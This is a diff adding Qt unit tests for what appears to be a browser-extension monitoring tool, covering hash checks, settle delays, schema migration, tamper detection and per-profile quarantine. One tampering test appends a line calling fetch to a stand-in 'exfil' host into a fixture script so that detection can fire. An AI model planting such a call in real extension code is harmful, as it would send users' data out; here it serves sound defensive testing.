@@ -1,6 +1,10 @@
 #include <QTemporaryDir>
 #include <QtTest>
 
+#include <QSqlDatabase>
+#include <QSqlQuery>
+
+#include "core/actions.h"
 #include "core/blobstore.h"
 #include "core/database.h"
 #include "core/discovery.h"
@@ -76,6 +80,7 @@ private slots:
 
         ScanOptions opts;
         opts.dataDir = dataDir;
+        opts.settleSeconds = 0;
         opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
 
         // First scan: baseline.
@@ -157,6 +162,7 @@ private slots:
             testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
         ScanOptions opts;
         opts.dataDir = dataDir;
+        opts.settleSeconds = 0;
         opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
         runScan(opts);
 
@@ -181,6 +187,190 @@ private slots:
         ScanResult disabled = runScan(opts);
         QCOMPARE(disabled.events.size(), 1);
         QCOMPARE(disabled.events.first().kind, QStringLiteral("disabled"));
+    }
+
+    void blobStoreRejectsBytesThatDoNotMatchTheHash() {
+        QTemporaryDir tmp;
+        BlobStore blobs(tmp.path());
+        QFile f(tmp.path() + QStringLiteral("/a.js"));
+        QVERIFY(f.open(QIODevice::WriteOnly));
+        f.write("console.log(1);\n");
+        f.close();
+        bool ok = false;
+        const QByteArray real = sha256File(f.fileName(), &ok);
+        QVERIFY(ok);
+        QByteArray wrong = real;
+        wrong[0] = static_cast<char>(wrong[0] ^ 0x01);
+        QString error;
+        QVERIFY(!blobs.put(f.fileName(), wrong, &error));  // the file no longer matches: refused
+        QVERIFY(error.contains(QStringLiteral("changed")));
+        QVERIFY(!blobs.has(wrong));
+        QVERIFY(blobs.put(f.fileName(), real, &error));
+        QVERIFY(blobs.verify(real));
+        QCOMPARE(blobs.allBlobs().size(), 1);
+    }
+
+    void freshlyWrittenVersionDirectoriesWaitToSettle() {
+        QTemporaryDir tmp;
+        const QString userData = tmp.path() + QStringLiteral("/User Data");
+        const QString dataDir = tmp.path() + QStringLiteral("/data");
+        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
+        // Copies keep the fixture's old timestamps; make one file look freshly written.
+        QFile fresh(profilePath + QStringLiteral("/Extensions/") + testutil::fixtureExtensionId() + QStringLiteral("/1.0.0_0/sw.js"));
+        QVERIFY(fresh.open(QIODevice::ReadWrite));
+        QVERIFY(fresh.setFileTime(QDateTime::currentDateTime(), QFileDevice::FileModificationTime));
+        fresh.close();
+        ScanOptions opts;
+        opts.dataDir = dataDir;
+        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
+        opts.settleSeconds = 60;  // written seconds ago: still "being written"
+        opts.settleRetries = 0;
+        const ScanResult first = runScan(opts);
+        QVERIFY(first.needsRescan);
+        QVERIFY(first.events.isEmpty());  // nothing archived yet
+        QVERIFY(!first.browsers.first().profiles.first().extensions.first().versions.first().settled);
+        opts.settleSeconds = 0;
+        const ScanResult second = runScan(opts);
+        QCOMPARE(second.events.size(), 1);
+        QCOMPARE(second.events.first().kind, QStringLiteral("baseline"));
+    }
+
+    void unchangedTreesReuseTheStoredFingerprint() {
+        QTemporaryDir tmp;
+        const QString userData = tmp.path() + QStringLiteral("/User Data");
+        testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
+        ScanOptions opts;
+        opts.dataDir = tmp.path() + QStringLiteral("/data");
+        opts.settleSeconds = 0;
+        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
+        runScan(opts);
+        const ScanResult again = runScan(opts);
+        const VersionReport& v = again.browsers.first().profiles.first().extensions.first().versions.first();
+        QVERIFY(v.reused);
+        QVERIFY(!v.treeHash.isEmpty());
+    }
+
+    void sameVersionDifferentBytesIsItsOwnEvent() {
+        QTemporaryDir tmp;
+        const QString userData = tmp.path() + QStringLiteral("/User Data");
+        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
+        ScanOptions opts;
+        opts.dataDir = tmp.path() + QStringLiteral("/data");
+        opts.settleSeconds = 0;
+        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
+        runScan(opts);
+        // Tamper with the installed files without touching the version.
+        QFile content(profilePath + QStringLiteral("/Extensions/") + testutil::fixtureExtensionId() + QStringLiteral("/1.0.0_0/content.js"));
+        QVERIFY(content.open(QIODevice::Append));
+        content.write("\nfetch('https://exfil.example.invalid/');\n");
+        content.close();
+        const ScanResult tampered = runScan(opts);
+        QCOMPARE(tampered.events.size(), 1);
+        QCOMPARE(tampered.events.first().kind, QStringLiteral("modified_in_place"));
+        QCOMPARE(tampered.events.first().toVersion, QStringLiteral("1.0.0"));
+        QVERIFY(tampered.events.first().summary().contains(QStringLiteral("without a version change")));
+    }
+
+    void pendingVersionIsReportedOnTheFirstScanToo() {
+        QTemporaryDir tmp;
+        const QString userData = tmp.path() + QStringLiteral("/User Data");
+        const QString profilePath = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
+        testutil::simulateUpdate(profilePath, QStringLiteral("1.1.0"), /*switchPrefs=*/false);
+        ScanOptions opts;
+        opts.dataDir = tmp.path() + QStringLiteral("/data");
+        opts.settleSeconds = 0;
+        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
+        const ScanResult first = runScan(opts);
+        QStringList kinds;
+        for (const ScanEvent& e : first.events) kinds.append(e.kind);
+        QVERIFY(kinds.contains(QStringLiteral("baseline")));
+        QVERIFY(kinds.contains(QStringLiteral("pending_version")));
+    }
+
+    void schemaOneDatabasesAreMigrated() {
+        QTemporaryDir tmp;
+        const QString path = tmp.path() + QStringLiteral("/old.sqlite");
+        {
+            QSqlDatabase old = QSqlDatabase::addDatabase(QStringLiteral("QSQLITE"), QStringLiteral("legacy"));
+            old.setDatabaseName(path);
+            QVERIFY(old.open());
+            QSqlQuery q(old);
+            QVERIFY(q.exec(QStringLiteral("CREATE TABLE meta(key TEXT PRIMARY KEY, value TEXT)")));
+            QVERIFY(q.exec(QStringLiteral("INSERT INTO meta VALUES('schema_version','1')")));
+            QVERIFY(q.exec(QStringLiteral("CREATE TABLE browsers(id INTEGER PRIMARY KEY, kind TEXT NOT NULL, user_data_dir TEXT NOT NULL UNIQUE, display_name TEXT, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL)")));
+            QVERIFY(q.exec(QStringLiteral("CREATE TABLE profiles(id INTEGER PRIMARY KEY, browser_id INTEGER NOT NULL, dir_name TEXT NOT NULL, display_name TEXT, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL, UNIQUE(browser_id, dir_name))")));
+            QVERIFY(q.exec(QStringLiteral("CREATE TABLE extensions(id INTEGER PRIMARY KEY, profile_id INTEGER NOT NULL, ext_id TEXT NOT NULL, name TEXT, location INTEGER, from_webstore INTEGER, enabled INTEGER, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL, current_version_id INTEGER, UNIQUE(profile_id, ext_id))")));
+            QVERIFY(q.exec(QStringLiteral("CREATE TABLE versions(id INTEGER PRIMARY KEY, extension_id INTEGER NOT NULL, version TEXT NOT NULL, dir_name TEXT NOT NULL, tree_hash TEXT NOT NULL, first_seen INTEGER NOT NULL, last_seen INTEGER NOT NULL, activated_at INTEGER, manifest_json TEXT, signature_json TEXT, file_count INTEGER, bytes INTEGER, key_matches_id INTEGER, has_webstore_metadata INTEGER, UNIQUE(extension_id, tree_hash))")));
+            QVERIFY(q.exec(QStringLiteral("INSERT INTO browsers VALUES(1,'chrome','/x','Chrome',1,1)")));
+            QVERIFY(q.exec(QStringLiteral("INSERT INTO profiles VALUES(1,1,'Default','Default',1,1)")));
+            QVERIFY(q.exec(QStringLiteral("INSERT INTO extensions VALUES(1,1,'abcdefghijklmnopabcdefghijklmnop','Old',1,1,1,1,1,NULL)")));
+            QVERIFY(q.exec(QStringLiteral("INSERT INTO versions VALUES(1,1,'1.0','1.0_0','ab',1,1,NULL,'{}','',1,1,1,1)")));
+            old.close();
+        }
+        QSqlDatabase::removeDatabase(QStringLiteral("legacy"));
+        Database db;
+        QString error;
+        QVERIFY2(db.open(path, &error), qPrintable(error));
+        QCOMPARE(db.schemaVersion(), Database::kSchemaVersion);
+        const QList<VersionRow> versions = db.versionsForExtension(1);
+        QCOMPARE(versions.size(), 1);
+        QCOMPARE(versions.first().state, QStringLiteral("complete"));
+        QVERIFY(versions.first().statFingerprint.isEmpty());
+        QVERIFY(db.setVersionFingerprint(1, QStringLiteral("1:1:1")));
+        QuarantineRow q;
+        q.id = QStringLiteral("test-q");
+        q.extensionId = 1;
+        q.extId = QStringLiteral("abcdefghijklmnopabcdefghijklmnop");
+        q.originalPath = QStringLiteral("/x/Default/Extensions/a/1.0_0");
+        q.quarantinePath = QStringLiteral("/data/quarantine/test-q");
+        q.createdAt = 1;
+        q.state = QStringLiteral("quarantined");
+        QVERIFY(db.insertQuarantine(q));
+        QCOMPARE(db.quarantinesForExtension(1).size(), 1);
+    }
+
+    void quarantineIsScopedToOneProfileAndRestoresToItsOrigin() {
+        QTemporaryDir tmp;
+        const QString userData = tmp.path() + QStringLiteral("/User Data");
+        const QString dataDir = tmp.path() + QStringLiteral("/data");
+        // The same extension and version in two profiles.
+        const QString profileA = testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.0.0"));
+        const QString profileB = testutil::makeFakeUserDataDir(userData, QStringLiteral("Profile 2"), QStringLiteral("1.0.0"));
+        ScanOptions opts;
+        opts.dataDir = dataDir;
+        opts.settleSeconds = 0;
+        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
+        runScan(opts);
+        Database db;
+        QVERIFY(db.open(databasePath(dataDir)));
+        const QList<ExtensionRow> rows = db.extensionsByExtId(testutil::fixtureExtensionId());
+        QCOMPARE(rows.size(), 2);
+        const ExtensionRow& rowB = rows.last();
+        const std::optional<ProfileRow> profile = db.profileById(rowB.profileId);
+        QVERIFY(profile);
+        QCOMPARE(profile->dirName, QStringLiteral("Profile 2"));
+        const VersionRow version = db.versionById(*rowB.currentVersionId).value();
+        QuarantineRequest req;
+        req.extensionId = rowB.id;
+        req.extId = rowB.extId;
+        req.browserKind = QStringLiteral("chrome");
+        req.userDataDir = userData;
+        req.profileDir = profile->dirName;
+        req.version = version.version;
+        req.dirName = version.dirName;
+        req.treeHash = version.treeHash;
+        req.versionDirPath = profileB + QStringLiteral("/Extensions/") + rowB.extId + u'/' + version.dirName;
+        const ActionResult q = quarantineVersion(db, dataDir, req);
+        QVERIFY2(q.ok, qPrintable(q.message));
+        QVERIFY(!QFileInfo::exists(req.versionDirPath));                                            // gone from Profile 2
+        QVERIFY(QFileInfo(profileA + QStringLiteral("/Extensions/") + rowB.extId + u'/' + version.dirName).isDir());  // Default untouched
+        QCOMPARE(db.quarantinesForExtension(rows.first().id).size(), 0);  // not attributed to the other profile
+        QCOMPARE(db.quarantinesForExtension(rowB.id).size(), 1);
+        const ActionResult r = restoreQuarantine(db, dataDir, q.quarantineId);
+        QVERIFY2(r.ok, qPrintable(r.message));
+        QVERIFY(QFileInfo(req.versionDirPath).isDir());  // back exactly where it came from
+        QCOMPARE(db.quarantineById(q.quarantineId)->state, QStringLiteral("restored"));
+        QVERIFY(!restoreQuarantine(db, dataDir, q.quarantineId).ok);  // cannot restore twice
     }
 };
 
